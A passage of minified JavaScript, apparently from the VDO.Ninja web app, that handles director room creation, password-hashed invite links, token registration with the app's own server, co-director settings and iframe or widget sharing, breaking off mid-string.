if(defaultSpeaker);else if(lastActiveSpeaker)session.rpcs[lastActiveSpeaker].defaultSpeaker=!0,changed=!0;else if(!1===session.scene||!1===session.nopreview&&1!==session.minipreview);else{for(var UUID in session.rpcs)if(session.rpcs[UUID].videoElement&&session.rpcs[UUID].videoElement.srcObject&&session.rpcs[UUID].videoElement.srcObject.getVideoTracks().length&&!session.rpcs[UUID].videoMuted){session.rpcs[UUID].defaultSpeaker=!0,changed=!0;break}if(!changed&&session.activeSpeaker<=2)for(var UUID in session.rpcs){if(session.rpcs[UUID].label){session.rpcs[UUID].defaultSpeaker=!0,changed=!0;break}changed||(session.rpcs[UUID].defaultSpeaker=!0,changed=!0)}}session.quietOthers&&1===session.quietOthers?someoneElseIfSpeaking?0==session.muted_activeSpeaker&&(session.muted_activeSpeaker=!0,session.muted=!0,toggleMute(!0)):1==session.muted_activeSpeaker&&(session.muted=!1,session.muted_activeSpeaker=!1,toggleMute(!0)):session.quietOthers&&3===session.quietOthers&&(someoneElseIfSpeaking?0==session.muted_activeSpeaker&&(session.muted_activeSpeaker=!0,session.speakerMuted=!0,toggleSpeakerMute(!0)):1==session.muted_activeSpeaker&&(session.speakerMuted=!1,session.muted_activeSpeaker=!1,toggleSpeakerMute(!0))),changed&&setTimeout((function(){updateMixer()}),0)}function randomizeArray(unshuffled){for(var arr=unshuffled.map((a=>({sort:Math.random(),value:a}))).sort(((a,b)=>a.sort-b.sort)).map((a=>a.value)),i=arr.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1)),tmp=arr[i];arr[i]=arr[j],arr[j]=tmp}return arr}function joinRoom(roomname){roomname.length?(roomname=sanitizeRoomName(roomname),log("Join room: "+roomname),updateVolume(!1),session.joinRoom(roomname).then((function(response){"seedPlz"===session.joiningRoom?(session.joiningRoom=!1,session.seedStream()):session.joiningRoom=!1;var invite,token="";(session.token&&(token+="&token="+session.token),session.cleanOutput)||session.roomhost&&(!1===session.defaultPassword?!1===session.password?warnUser("You can invite others with:\n\n<a target='_blank' title='Copy this link to the clipboard' style='cursor:pointer' onclick='copyFunction(this.innerText,event);' href='"+(invite="https://"+location.host+location.pathname+"?room="+session.roomid+"&password=false"+token)+"'>"+invite+"</a>",!1,!1):generateHash(session.password+session.salt,4).then((function(hash){var invite="https://"+location.host+location.pathname+"?room="+session.roomid+"&hash="+hash+token;warnUser("You can invite others with:\n\n<a target='_blank' title='Copy this link to the clipboard' style='cursor:pointer' onclick='copyFunction(this.innerText,event)' href='"+invite+"'>"+invite+"</a>",!1,!1)})):warnUser("You can invite others with:\n\n<a target='_blank' title='Copy this link to the clipboard' style='cursor:pointer' onclick='copyFunction(this.innerText,event)' href='"+(invite="https://"+location.host+location.pathname+"?room="+session.roomid+token)+"'>"+invite+"</a>",!1,!1));if(log("Members in Room"),log(response),!0===session.randomize){for(var i in response=randomizeArray(response),log("Randomized List of Viewers"),log(response),response)if("UUID"in response[i]&&"streamID"in response[i])if(response[i].UUID in session.rpcs)log("RTC already connected");else{log(response[i].streamID);var streamID=session.desaltStreamID(response[i].streamID);session.queue?session.directorList.indexOf(response[i].UUID)>=0?2==session.queueType&&(warnlog("PLAYING DIRECTOR"),play(streamID,response[i].UUID)):session.view_set&&session.view_set.includes(streamID)?play(streamID,response[i].UUID):session.queueList.length<5e3&&(streamID in session.watchTimeoutList||session.queueList.includes(streamID)||session.queueList.push(streamID)):(log("STREAM ID DESALTED 3: "+streamID),setTimeout((function(sid){play(sid)}),Math.floor(100*Math.random()),streamID))}}else for(var i in response)if("UUID"in response[i]&&"streamID"in response[i])if(response[i].UUID in session.rpcs)log("RTC already connected");else{log(response[i].streamID);streamID=session.desaltStreamID(response[i].streamID);session.queue?session.directorList.indexOf(response[i].UUID)>=0?2==session.queueType&&play(streamID,response[i].UUID):session.view_set&&session.view_set.includes(streamID)?play(streamID,response[i].UUID):session.queueList.length<5e3&&(streamID in session.watchTimeoutList||session.queueList.includes(streamID)||session.queueList.push(streamID)):(log("STREAM ID DESALTED 3: "+streamID),play(streamID,response[i].UUID))}updateQueue(),pokeIframeAPI("joined-room-complete"),session.include.length&&session.include.forEach((sid=>{sid in session.waitingWatchList||session.watchStream(sid)}))}),(function(error){return{}}))):log("Room name not long enough or contained all bad characaters")}async function createRoom(roomname=!1){if(0==roomname&&(roomname=getById("videoname1").value,roomname=sanitizeRoomName(roomname),clearDirectorSettings(),0!=roomname.length&&(urlParams.has("dir")?updateURL("dir="+roomname,!0,!1):updateURL("director="+roomname,!0,!1))),0==roomname.length)return getById("videoname1").focus(),getById("videoname1").classList.remove("shake"),void setTimeout((function(){getById("videoname1").classList.add("shake")}),10);log(roomname),session.roomid=roomname,getById("dirroomid").innerHTML=decodeURIComponent(session.roomid),getById("roomid").innerHTML=session.roomid;var passwordRoom=getById("passwordRoom").value;passwordRoom=sanitizePassword(passwordRoom);var passAdd="",passAdd2="";if(passwordRoom.length&&(session.password=passwordRoom,session.defaultPassword=!1,"false"===session.password||"0"===session.password||"off"===session.password?(session.password=!1,urlParams.has("pass")?(updateURL("pass=0"),passAdd="&pass=0",passAdd2="&pass=0"):urlParams.has("pw")?(updateURL("pw=0"),passAdd="&pw=0",passAdd2="&pw=0"):urlParams.has("p")?(updateURL("p=0"),passAdd="&p=0",passAdd2="&p=0"):urlParams.has("password")?(updateURL("password=false"),passAdd="&password=false",passAdd2="&password=false"):(updateURL("p=0"),passAdd="&p=0",passAdd2="&p=0")):urlParams.has("pass")?updateURL("pass="+session.password):urlParams.has("pw")?updateURL("pw="+session.password):urlParams.has("p")?updateURL("p="+session.password):updateURL("password="+session.password)),await registerToken(),!1===session.defaultPassword&&session.password)return passAdd2="&password="+session.password,generateHash(session.password+session.salt,4).then((async function(hash){passAdd="&hash="+hash,await createRoomCallback(passAdd,passAdd2)})).catch(errorlog);!1===session.defaultPassword&&!1===session.password?(passAdd="&p=0",passAdd2="&p=0",await createRoomCallback(passAdd,passAdd2)):await createRoomCallback(passAdd,passAdd2),session.meshcast&&(session.cleanOutput||session.cleanDirector||document.getElementById("meshcastMenu").classList.remove("hidden")),pokeIframeAPI("create-room",roomname)}function copyVideoFrameToClipboard(videoElement,e=!1){try{var canvas=document.createElement("canvas");canvas.width=videoElement.videoWidth,canvas.height=videoElement.videoHeight,canvas.getContext("2d").drawImage(videoElement,0,0),(new Image).src=canvas.toDataURL(),canvas.toBlob((function(blob){navigator.clipboard.write([new ClipboardItem({"image/png":blob})])}),"image/png"),popupMessage(e,"Frame copied to clipboard as as PNG Image")}catch(e){errorlog(e)}}function saveVideoFrameToClipboard(videoElement,e=!1){try{var canvas=document.createElement("canvas");canvas.width=videoElement.videoWidth,canvas.height=videoElement.videoHeight,canvas.getContext("2d").drawImage(videoElement,0,0),(new Image).src=canvas.toDataURL(),canvas.toBlob((function(blob){var link=document.createElement("a");link.download=e?(videoElement.id||"video")+"_"+parseInt(performance.now())+".png":(videoElement.id||"video")+"_"+parseInt(Date.now())+".png",link.href=URL.createObjectURL(blob),link.click(),URL.revokeObjectURL(link.href)}),"image/png"),e&&popupMessage(e,"Saving current frame to disk")}catch(e){errorlog(e)}}async function checkDirectorStreamID(){if(session.directorStreamID){for(var UUID in session.rpcs){if(session.rpcs[UUID].streamID)if(await generateHash(session.rpcs[UUID].streamID)===session.directorStreamID)return session.directorUUID=UUID,session.directorList=[],session.directorList.push(UUID),session.directorUUID=UUID,void session.newMainDirectorSetup()}for(var UUID in session.pcs){if(session.pcs[UUID].streamID)if(await generateHash(session.pcs[UUID].streamID)===session.directorStreamID)return session.directorList=[],session.directorList.push(UUID),session.directorUUID=UUID,void session.newMainDirectorSetup()}session.streamID==session.directorStreamID&&(session.directorState=!0,session.directorUUID=!1,pokeAPI("director",!0),pokeIframeAPI("director",!0),warnlog("You are joining with a token, but are the director?")),session.directorList=[]}}async function checkToken(){if(session.token&&session.roomid&&!session.mainDirectorPassword)try{var request=new XMLHttpRequest,hashedRoom=session.roomid;if(session.password&&(hashedRoom+=session.password),hashedRoom+="i^4&u#Fz5Eu#MsK^chF5*XAEYi1g",hashedRoom=(hashedRoom=await generateHash(hashedRoom)).slice(0,50),request.open("GET","https://tokens.vdo.ninja/?token="+session.token+"&room="+hashedRoom,!1),request.send(null),200===request.status)try{var result=JSON.parse(request.responseText);"UUID"in result?(session.directorUUID=result.UUID,session.directorList=[],session.directorList.push(session.directorUUID),session.directorStreamID=!1,session.newMainDirectorSetup()):"streamID"in result&&(session.directorStreamID=result.streamID,checkDirectorStreamID())}catch(e){session.directorUUID=!1,session.directorStreamID=!1,session.directorList=[],errorlog(e)}else session.directorUUID=!1,session.directorStreamID=!1,session.directorList=[],errorlog("Didn't get a token response")}catch(e){errorlog(e)}}async function registerToken(){if(session.roomid&&session.streamID&&session.mainDirectorPassword){var longToken=session.mainDirectorPassword+"3wJVW^5qYU4DxGi6VhxN6RF04Q%$",hashedToken=await generateHash(longToken);hashedToken=hashedToken.slice(0,50);var hashedRoom=session.roomid;session.password&&(hashedRoom+=session.password),hashedRoom+="i^4&u#Fz5Eu#MsK^chF5*XAEYi1g",hashedRoom=(hashedRoom=await generateHash(hashedRoom)).slice(0,50);var data2send={},hashedSID=await generateHash(session.streamID);data2send.streamID=hashedSID,data2send=JSON.stringify(data2send);var request=new XMLHttpRequest;if(request.open("POST","https://tokens.vdo.ninja/?token="+hashedToken+"&room="+hashedRoom,!1),console.log("https://tokens.vdo.ninja/?token="+hashedToken+"&room="+hashedRoom),request.send(data2send),200===request.status)try{request.responseText&&16===request.responseText.length&&(session.token=request.responseText,console.log("share token: "+session.token),session.directorState=!0,pokeAPI("director",!0),pokeIframeAPI("director",!0))}catch(e){session.directorState=!1,pokeAPI("director",!1),pokeIframeAPI("director",!1)}else session.directorState=!1,pokeAPI("director",!1),pokeIframeAPI("director",!1)}}function hideDirectorinvites(ele,skip=!0){"none"==getById("directorLinks2").style.display?(ele.innerHTML='<i class="las la-caret-down"></i><span data-translate="hide-the-links"> LINKS (GUEST INVITES & SCENES)</span>',getById("directorLinks2").style.display="inline-block",getById("customizeLinks").classList.remove("hidden")):(ele.innerHTML='<i class="las la-caret-right"></i><span data-translate="hide-the-links"> LINKS (GUEST INVITES & SCENES)</span>',getById("directorLinks2").style.display="none",getById("help_directors_room").style.display="none",getById("roomnotes2").style.display="none",getById("customizeLinks").classList.add("hidden")),"none"==getById("directorLinks1").style.display?(getById("directorLinks1").style.display="inline-block",getById("customizeLinks").classList.remove("hidden")):(getById("directorLinks1").style.display="none",getById("help_directors_room").style.display="none",getById("roomnotes2").style.display="none",getById("customizeLinks").classList.add("hidden")),skip&&saveDirectorSettings()}function toggleCoDirector_changeurl(ele){session.codirector_changeURL=ele.checked}function toggleCoDirector_transfer(ele){session.codirector_transfer=ele.checked}async function toggleCoDirector(ele){if(ele.checked){if(!session.directorPassword){if(session.directorPassword=await promptAlt(getTranslation("enter-new-codirector-password"),!1),!session.directorPassword)return session.directorPassword=!1,void(ele.checked=!1);session.directorPassword=sanitizePassword(session.directorPassword)}updateURL("codirector="+session.directorPassword,!0,!1),getById("coDirectorEnableSpan").style.display="none",await generateHash(session.directorPassword+session.salt+"abc123",12).then((function(hash){log("dir room hash is "+hash),session.directorHash=hash})).catch(errorlog),session.codirector_transfer?getById("codirectorSettings_transfer").checked=!0:getById("codirectorSettings_transfer").checked=!1,session.codirector_changeURL?getById("codirectorSettings_changeurl").checked=!0:getById(codirectorSettings_changeurl).checked=!1;var token="";session.token&&(token+="&token="+session.token),getById("codirectorSettings_invite").value="https://"+location.host+location.pathname+"?dir="+session.roomid+"&codirector="+session.directorPassword+token,session.password!==session.sitePassword&&(!1===session.password?getById("codirectorSettings_invite").value+="&password=false":getById("codirectorSettings_invite").value+="&password="+session.password),getById("codirectorSettings").style.display="block"}else getById("codirectorSettings").style.display="none"}async function toggleWidgetURL(ele){if("widgetURL"===ele.id)ele=getById("widgetURCheck");else if(!ele.checked){getById("widgetURL").classList.add("hidden"),session.widget=!1;var data={widgetSrc:!1};for(var UUID in session.pcs)!0===session.pcs[UUID].allowWidget&&session.sendMessage(data,UUID);if(session.director){document.getElementById("widget")&&(getById("widget").remove(),getById("guestFeeds").style.width="100%")}return void pokeIframeAPI("widget-src",session.widget)}var widget=await promptAlt(getTranslation("enter-url-for-widget"),!1,!1,session.widget);null!==widget&&(session.widget=widget),session.widget?(getById("widgetURL").value=session.widget,getById("widgetURL").classList.remove("hidden"),updateMixer()):(session.widget=!1,getById("widgetURL").classList.add("hidden"),ele.checked=!1);data={};for(var UUID in data.widgetSrc=session.widget,session.pcs)!0===session.pcs[UUID].allowWidget&&session.sendMessage(data,UUID);if(session.director){let widget=document.getElementById("widget");widget?session.widget&&(session.widget?widget.src=parseURL4Iframe(session.widget):(getById("widget").remove(),getById("guestFeeds").style.width="100%")):session.widget&&(widget=document.createElement("iframe"),widget.allow="autoplay;camera;microphone;fullscreen;picture-in-picture;display-capture;midi;",widget.id="widget",widget.src=parseURL4Iframe(session.widget),log(widget.src),document.body.appendChild(widget),getById("guestFeeds").style.width="75%")}pokeIframeAPI("widget-src",session.widget)}async function createRoomCallback(passAdd,passAdd2){session.switchMode||(getById("directorlayout").classList.remove("hidden"),getById("gridlayout").classList.add("hidden"));var broadcastFlag=getById("broadcastFlag");try{broadcastFlag=!!broadcastFlag.checked}catch(e){broadcastFlag=!1}var broadcastString="";broadcastFlag&&(broadcastString="&broadcast",getById("broadcastSlider").checked=!0);var wss="";session.wssSetViaUrl&&(wss=session.customWSS&&!0!==session.customWSS?"&pie="+session.customWSS:"&wss="+session.wss);var queue="";session.queue&&(queue="&queue",getById("directorLinks2").style.opacity="0.2",getById("directorLinks2").style.pointerEvents="none",getById("directorLinks2").style.cursor="not-allowed");var showdirectorFlag=getById("showdirectorFlag");try{showdirectorFlag=!!showdirectorFlag.checked}catch(e){showdirectorFlag=!1}showdirectorFlag&&(updateURL("showdirector",!0,!1),session.showDirector=session.showDirector||!0);var codecGroupFlag=getById("codecGroupFlag");codecGroupFlag.value?"vp9"===codecGroupFlag.value?(codecGroupFlag="&codec=vp9",getById("codech264toggle").disabled=!0):"h264"===codecGroupFlag.value?(codecGroupFlag="&codec=h264",getById("codech264toggle").checked=!0):"vp8"===codecGroupFlag.value?(codecGroupFlag="&codec=vp8",getById("codech264toggle").disabled=!0):"av1"===codecGroupFlag.value?(codecGroupFlag="&codec=av1",getById("codech264toggle").disabled=!0):codecGroupFlag="":codecGroupFlag="",codecGroupFlag&&(session.codecGroupFlag=codecGroupFlag),session.bitrateGroupFlag&&(codecGroupFlag+=session.bitrateGroupFlag),formSubmitting=!1;try{getById("mainmenu").remove(),document.querySelectorAll(".hidden2").forEach((ele2=>{ele2.classList.remove("hidden2")}))}catch(e){}getById("head1").className="hidden",getById("head2").className="hidden",getById("head4").className="";try{!1===session.label&&(document.title="Control Room")}catch(e){errorlog(e)}if(session.director=!0,screensharesupport=!1,!1===session.meterStyle&&(session.meterStyle=1),null===session.signalMeter&&(session.signalMeter=!0),null===session.batteryMeter&&(session.batteryMeter=!0),session.directorPassword){getById("coDirectorEnable").checked=!0,getById("coDirectorEnableSpan").style.display="none";var token="";session.token&&(token+="&token="+session.token),getById("codirectorSettings_invite").value="https://"+location.host+location.pathname+"?dir="+session.roomid+"&codirector="+session.directorPassword+token,session.password!==session.sitePassword&&(0==session.password?getById("codirectorSettings_invite").value+="&password=false":getById("codirectorSettings_invite").value+="&password="+session.password),session.codirector_transfer?getById("codirectorSettings_transfer").checked=!0:getById("codirectorSettings_transfer").checked=!1,session.codirector_changeURL?getById("codirectorSettings_changeurl").checked=!0:getById("codirectorSettings_changeurl").checked=!1,getById("codirectorSettings").style.display="block"}window.onresize=updateMixer,window.onorientationchange=function(){Firefox&&updateForceRotate(!0),setTimeout((async function(){session.forceAspectRatio&&await updateCameraConstraints("aspectRatio",session.forceAspectRatio),session.effect&&"7"===session.effect&&digitalZoom(!0),updateForceRotate(),updateMixer()}),200)},getById("reshare").parentNode.removeChild(getById("reshare")),!1===session.speakerMuted_default||(session.speakerMuted=!0),toggleSpeakerMute(!0);token="";if(session.token&&(token+="&token="+session.token),0==session.cleanDirector&&0==session.cleanOutput?(getById("roomHeader").style.display="",getById("directorLinks1").style.display="inline-block",getById("directorLinks2").style.display="inline-block",getById("director_block_1").dataset.raw="https://"+location.host+location.pathname+"?room="+session.roomid+broadcastString+passAdd+wss+queue+token,getById("director_block_1").href="https://"+location.host+location.pathname+"?room="+session.roomid+broadcastString+passAdd+wss+queue+token,getById("director_block_1").innerText="https://"+location.host+location.pathname+"?room="+session.roomid+broadcastString+passAdd+wss+queue+token,getById("director_block_3").dataset.raw="https://"+location.host+location.pathname+"?scene&room="+session.roomid+codecGroupFlag+passAdd2+wss+token,getById("director_block_3").href="https://"+location.host+location.pathname+"?scene&room="+session.roomid+codecGroupFlag+passAdd2+wss+token,getById("director_block_3").innerText="https://"+location.host+location.pathname+"?scene&room="+session.roomid+codecGroupFlag+passAdd2+wss+token,getById("calendarButton").style.display="inline-block"):getById("guestFeeds").innerHTML="",getById("guestFeeds").style.display="",session.cleanOutput)getById("miniPerformer").style.display="none",getById("controlButtons").classList.add("hidden");else{session.queue&&getById("queuebutton").classList.remove("hidden"),getById("chatbutton").classList.remove("hidden"),getById("sharefilebutton").classList.remove("hidden"),getById("controlButtons").classList.remove("hidden"),getById("mutespeakerbutton").classList.remove("hidden"),getById("websitesharebutton").classList.remove("hidden"),session.totalRoomBitrate&&getById("roomsettingsbutton").classList.remove("hidden"),session.showDirector?getById("miniPerformer").innerHTML='<button id="press2talk" onmousedown="event.preventDefault(); event.stopPropagation();" class="float" onclick="press2talk(true);" title="You can also enable the director`s Video Output afterwards by clicking the Setting`s button"><i class="las la-headset"></i><span data-translate="push-to-talk-enable-2"> enable director`s microphone or video</span></button>':(getById("miniPerformer").innerHTML='<button id="press2talk" onmousedown="event.preventDefault(); event.stopPropagation();" class="float" onclick="press2talk(true);" title="You can also enable the director`s Video Output afterwards by clicking the Setting`s button"><i class="las la-headset"></i><span data-translate="push-to-talk-enable"> enable director`s microphone or video<br />(only guests can see this feed)</span></button>',miniTranslate(getById("miniPerformer")),getById("grabDirectorSoloLink").dataset.raw="https://"+location.host+location.pathname+"?solo&r="+session.roomid+"&v="+session.streamID+passAdd2+wss+token,getById("grabDirectorSoloLink").href="https://"+location.host+location.pathname+"?solo&r="+session.roomid+"&v="+session.streamID+passAdd2+wss+token,getById("grabDirectorSoloLink").innerText="https://"+location.host+location.pathname+"?solo&r="+session.roomid+"&v="+session.streamID+passAdd2+wss+token,getById("grabDirectorSoloLinkParent").classList.remove("hidden")),getById("miniPerformer").className="";var tabindex=26;if(session.rooms&&session.rooms.length>0){var container=getById("rooms");container.innerHTML+='<span style="display:inline-block">Arm Transfer: </span>',session.rooms.forEach((function(r){container.innerHTML+='<button id="roomselect_'+r+'" onmousedown="event.preventDefault(); event.stopPropagation();"  style="display:inline-block" class="float btnArmTransferRoom" onclick="handleRoomSelect(\''+r+'\');" title="Arm/disarm transfer to this room" tabindex="'+tabindex+'"><i class="las la-paper-plane"></i>'+r+"</button>",tabindex++}))}}!0===session.chatbutton?(getById("chatbutton").classList.remove("hidden"),getById("controlButtons").classList.remove("hidden")):!1===session.chatbutton&&getById("chatbutton").classList.add("hidden"),!1===session.effect&&(session.effect=null),getById("avatarDiv3").classList.remove("hidden"),clearInterval(session.updateLocalStatsInterval),session.updateLocalStatsInterval=setInterval((function(){updateLocalStats()}),session.statsInterval);var directorWebsiteShare=getStorage("directorWebsiteShare");"object"==typeof directorWebsiteShare&&null!==directorWebsiteShare&&"website"in directorWebsiteShare&&(0==directorWebsiteShare.website?clearDirectorSettings():directorWebsiteShare.roomid&&directorWebsiteShare.roomid==session.roomid&&(session.iframeSrc=directorWebsiteShare.website,session.defaultIframeSrc=directorWebsiteShare.website,getById("websitesharebutton").classList.add("hidden"),getById("websitesharebutton2").classList.remove("hidden"))),session.group.forEach((group=>{changeGroupDirectorAPI(group,!0,!1)})),session.groupView.forEach((group=>{changeGroupViewDirectorAPI(group,!0)})),session.showDirector?(getById("highlightDirectorSpan").style.display="none",getById("highlightDirectorSpan").remove()):getById("highlightDirector").dataset.sid=session.streamID,setTimeout((function(){loadDirectorSettings()}),100),joinRoom(session.roomid);try{gotDevices2AlreadyRan||!iOS&&!iPad||await enumerateDevices().then(gotDevices2)}catch(e){errorlog(e)}session.autostart?setTimeout((function(){press2talk(!0)}),400):(session.seeding=!0,session.seedStream())}function handleRoomSelect(room){var elems=document.querySelectorAll(".btnArmTransferRoom");[].forEach.call(elems,(function(el){el.classList.remove("selected")})),previousRoom==room?(previousRoom="",armedTransfer=!1,stillNeedRoom=!0):(previousRoom=room,stillNeedRoom=!1,armedTransfer=!0,getById("roomselect_"+room).classList.add("selected"))}function getDirectorSettings(scene=!1){var settings={},eles=document.querySelectorAll('[data-action-type="solo-video"]');settings.soloVideo=!1;for(var i=0;i<eles.length;i++)1==eles[i].value&&(warnlog(eles[i]),eles[i].dataset.sid&&(settings.soloVideo=eles[i].dataset.sid));if(scene){eles=document.querySelectorAll('[data-action-type="addToScene"][data-scene="'+scene+'"');settings.scene={};for(i=0;i<eles.length;i++){if(1==eles[i].value)if(eles[i].dataset.sid)(msg={}).scene=scene,msg.action="display",msg.value=eles[i].value,msg.target=eles[i].dataset.sid,settings.scene[eles[i].dataset.sid]=msg}}settings.showDirector=session.showDirector,settings.mute={};for(eles=document.querySelectorAll('[data-action-type="mute-scene"]'),i=0;i<eles.length;i++){var msg;if(1==eles[i].value)if(eles[i].dataset.sid)(msg={action:"mute",scene:!0,value:1}).target=eles[i].dataset.sid,settings.mute[eles[i].dataset.sid]=msg}return settings}function requestInfocus(ele,evt=null,value=null){try{var sid=ele.dataset.sid}catch(e){warnlog("no stream ID found; requestinfocus");sid=!1;"highlightDirector"===ele.id&&session.streamID&&(sid=session.streamID)}null!==value&&ele.value;var special=!1;if(evt&&(special=evt.ctrlKey||evt.metaKey||!1)&&(special=!0),1==ele.value){ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",ele.classList.remove("altpress");var actionMsg={infocus:!1}}else{actionMsg={};special?actionMsg.infocus2=sid:actionMsg.infocus=sid;for(var eles=document.querySelectorAll('[data-action-type="solo-video"]'),i=0;i<eles.length;i++)log(eles),eles[i].classList.remove("pressed"),eles[i].ariaPressed="false",eles[i].classList.remove("altpress"),eles[i].value=0;ele.value=1,special?ele.classList.add("altpress"):(ele.classList.add("pressed"),ele.ariaPressed="true"),"highlightDirector"!==ele.id&&(getById("highlightDirector").checked=!1)}for(var uuid in session.pcs)session.pcs[uuid].solo||session.pcs[uuid].layout||session.sendMessage(actionMsg,uuid);return syncDirectorState(ele),1==ele.value}session.publishIFrame=function(iframeURL){session.cleanOutput||getById("websitesharebutton2").classList.remove("hidden"),session.transcript&&setTimeout((function(){setupClosedCaptions()}),1e3),session.iframeSrc=parseURL4Iframe(iframeURL);var iframe=document.createElement("iframe");iframe.allow="autoplay;camera;microphone;fullscreen;picture-in-picture;display-capture;midi;",iframe.src=session.iframeSrc,iframe.id="iframe_source",iframe.loadedYoutubeListen=!1,session.iframeEle=iframe;var container=document.createElement("div");return iframe.container=container,container.id="container_iframe",container.appendChild(iframe),getById("gridlayout").appendChild(container),session.iframeSrc.startsWith("https://www.youtube.com/")&&setTimeout((function(iframe_id){YoutubeListen(iframe_id)}),1e3,iframe.id),session.cover&&container.style.setProperty("height","100%","important"),!1!==session.roomid?(""!==session.roomid||session.view&&""!==session.view)&&(log("ROOMID EANBLED"),getById("head3").classList.add("hidden"),getById("head3a").classList.add("hidden"),joinRoom(session.roomid)):(getById("head3").classList.remove("hidden"),getById("head3a").classList.remove("hidden"),getById("logoname").style.display="none"),getById("head1").className="hidden",updatePushId(),getById("head1").className="hidden",getById("head2").className="hidden",session.cleanOutput?getById("controlButtons").classList.add("hidden"):(getById("chatbutton").className="float",getById("hangupbutton").className="float",getById("controlButtons").classList.remove("hidden"),getById("sharefilebutton").classList.remove("hidden"),getById("helpbutton").style.display="inherit",getById("reportbutton").style.display=""),!1===session.chatbutton&&getById("chatbutton").classList.add("hidden"),session.director||(!1!==session.scene?updateMixer():!1!==session.roomid?""===session.roomid?session.view&&""!==session.view?(session.windowed=!1,window.onresize=updateMixer,updateMixer()):(session.windowed=!0,container.classList.add("vidcon"),getById("mutespeakerbutton").classList.add("hidden"),container.style.width="100%",container.style.height="100%",container.style.alignItems="center",container.style.maxWidth="100%",container.style.maxHeight="100%",container.style.verticalAlign="middle",container.style.margin="auto",container.style.backgroundColor="#666",container.style.border="2px solid"):(window.onresize=updateMixer,session.windowed=!1,updateMixer()):(window.onresize=updateMixer,container.style.maxHeight="1280px",container.style.maxWidth="720px",container.style.verticalAlign="middle",container.style.height="100%",container.style.width="100%",container.style.margin="auto",container.style.alignItems="center",container.style.backgroundColor="#666")),session.seeding=!0,updateReshareLink(),pokeIframeAPI("started-iframe-share"),session.seedStream(),container};var fixScrollReset=null,fixScrollResetValue=null;function requestAudioSettings(ele){var UUID=ele.dataset.UUID;try{clearTimeout(fixScrollReset),fixScrollResetValue=getById("directorlayout").scrollTop,fixScrollReset=setTimeout((function(scrollpos){fixScrollReset=null,getById("directorlayout").scrollTop=scrollpos}),1e3,fixScrollResetValue),query("#container_"+UUID+" [data-action-type='advanced-camera-settings']").value=0,query("#container_"+UUID+" [data-action-type='advanced-camera-settings']").classList.remove("pressed"),query("#container_"+UUID+" [data-action-type='advanced-camera-settings']").ariaPressed="false",query("#container_"+UUID+" .advancedVideoSettings").classList.add("hidden"),query("#container_"+UUID+" .advancedVideoSettings").innerHTML=""}catch(e){}if(1==ele.value)return ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",query("#container_"+UUID+" .advancedAudioSettings").classList.add("hidden"),query("#container_"+UUID+" .advancedAudioSettings").innerHTML="",!1;ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",query("#container_"+UUID+" .advancedAudioSettings").innerHTML="";var actionMsg={getAudioSettings:!0};return session.sendRequest(actionMsg,UUID),!0}function requestVideoSettings(ele){var UUID=ele.dataset.UUID;try{clearTimeout(fixScrollReset),fixScrollResetValue=getById("directorlayout").scrollTop,fixScrollReset=setTimeout((function(scrollpos){fixScrollReset=null,getById("directorlayout").scrollTop=scrollpos}),1e3,fixScrollResetValue),query("#container_"+UUID+" [data-action-type='advanced-audio-settings']").value=0,query("#container_"+UUID+" [data-action-type='advanced-audio-settings']").classList.remove("pressed"),query("#container_"+UUID+" [data-action-type='advanced-audio-settings']").ariaPressed="false",query("#container_"+UUID+" .advancedAudioSettings").classList.add("hidden"),query("#container_"+UUID+" .advancedAudioSettings").innerHTML=""}catch(e){}if(1==ele.value)return ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",query("#container_"+UUID+" .advancedVideoSettings").classList.add("hidden"),query("#container_"+UUID+" .advancedVideoSettings").innerHTML="",!1;ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",query("#container_"+UUID+" .advancedVideoSettings").innerHTML="";var actionMsg={getVideoSettings:!0};return session.sendRequest(actionMsg,UUID),!0}async function createDirectorOnlyBox(){var soloLink=soloLinkGenerator(session.streamID);document.getElementById("deleteme")&&getById("deleteme").parentNode.removeChild(getById("deleteme"));var controls=getById("controls_directors_blank").cloneNode(!0);controls.classList.remove("hidden"),controls.id="controls_director";var container=document.createElement("div");container.className="vidcon directorMargins",container.id="container_director";var buttons="";if(session.slotmode){var slots=document.querySelectorAll("div.slotsbar[data-slot]"),biggestSlot=0,slotDefault=null;session.streamID in session.pastSlots&&(slotDefault=session.pastSlots[session.streamID]);var allSlots=[];if(1==session.slotmode){for(var i=0;i<slots.length;i++)parseInt(slots[i].dataset.slot)>biggestSlot&&(biggestSlot=parseInt(slots[i].dataset.slot)),slotDefault===parseInt(slots[i].dataset.slot)&&(slotDefault=null),allSlots.push(parseInt(slots[i].dataset.slot));biggestSlot+=1}if(null!==slotDefault)biggestSlot=slotDefault;else if(1==session.slotmode){var bestfree=0;for(i=1;i<=biggestSlot;i++)if(!allSlots.includes(i)){bestfree=i;break}biggestSlot=bestfree}var slotName="slot: "+biggestSlot;biggestSlot||(slotName="unset"),buttons+="<div draggable='true' title='Drag to swap layout positions' ondragend='dragendSlot(event)' ondragstart='dragSlot(event)' ondrop='dropSlot(event)' ondragover='allowDropSlot(event)' data-sid='"+session.streamID+"' data-slot='"+biggestSlot+"' class='slotsbar'>\t\t\t<button ondrop='dropSlot(event)' draggable='true' ondragend='dragendSlot(event)' ondragstart='dragSlot(event)' ondragover='allowDropSlot(event)' onclick='changeSlot(event, this);'>"+slotName+"</button></div>"}buttons+="<div title='Does not impact scene order.' class='shift'><i class='las la-angle-left' onclick='shiftPC(this,-1, true);'></i><i class='las la-angle-right' onclick='shiftPC(this,1, true)';></i></div>\t\t<div class='streamID' style='user-select: none;'>ID: <span style='user-select: text;'>"+session.streamID+"</span>\t\t\t<i class='las la-copy' data-sid='"+session.streamID+"'  onclick='copyFunction(this.dataset.sid,event)' title='Copy this Stream ID to the clipboard' style='cursor:pointer'></i>\t\t\t<i class='las la-window-minimize' onclick='minimizeMe(this, 'container_director')' title='Minimize this control box' style='cursor:pointer'></i>\t\t\t<span id='label_director' class='addALabel' title='Click here to edit the label for this stream. Changes will propagate to all viewers of this stream' data-translate='add-a-label'>"+getTranslation("add-a-label")+"</span>\t\t</div>\t\t<div id='videoContainer_director'></div>",container.innerHTML=buttons;var oldGroups=[];document.querySelectorAll("#groups [data-action-type='toggle-group'][data-group]:not(.green)").forEach((ee=>{oldGroups.push(ee.dataset.group)})),getById("groups").remove(),0==session.hidesololinks&&(controls.innerHTML+="<div 